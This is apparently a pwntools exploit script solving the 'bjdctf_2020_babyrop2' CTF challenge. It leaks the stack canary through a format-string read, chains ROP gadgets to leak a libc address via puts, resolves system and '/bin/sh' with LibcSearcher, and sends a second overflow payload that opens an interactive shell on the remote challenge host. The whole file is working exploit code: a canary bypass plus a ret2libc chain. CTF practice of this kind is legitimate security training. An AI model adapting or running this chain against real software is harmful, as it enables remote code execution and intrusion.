from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)


context(os='linux', arch='i386', log_level='debug')
binary = './bjdctf_2020_babyrop2'

context.binary = binary
elf = ELF(binary)
io = remote('node4.buuoj.cn',25165) if argv[1]=='r' else process(binary)


search_fun = 'read' #被泄露地址的函数
print_fun = 'puts' #打印被泄露地址的函数
main_addr = 0x400887
pop_rdi_ret = 0x400993
pop_rsi_r15_ret = 0x400991
ret_addr = 0x4008D9


print_fun_plt = elf.plt[print_fun]
search_fun_got = elf.got[search_fun]


io.sendlineafter(b'I\'ll give u some gift to help u!\n', b'%7$p')
io.recvuntil(b'0x')
carry = io.recv(16)
carry = str(carry,encoding='utf-8')
carry = int(carry,16)
print(hex(carry))


payload = b'a'*0x18 + p64(carry) + b'a'*0x8 + p64(pop_rdi_ret) + p64(search_fun_got) + p64(print_fun_plt) + p64(main_addr)  #根据选择的print_fun改变参数
io.recvuntil(b"Pull up your sword and tell me u story!\n")
io.send(payload)

search_addr = u64(io.recv(6).ljust(8,b'\x00'))
print(hex(search_addr))
print("search_addr = ",hex(search_addr))
system_addr,binsh_addr = ret2libc(search_addr,search_fun)


payload1 = b'a'*0x18 + p64(carry) + b'a'*0x8  + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)
io.recvuntil(b"Pull up your sword and tell me u story!\n")
io.send(payload1)
io.interactive()


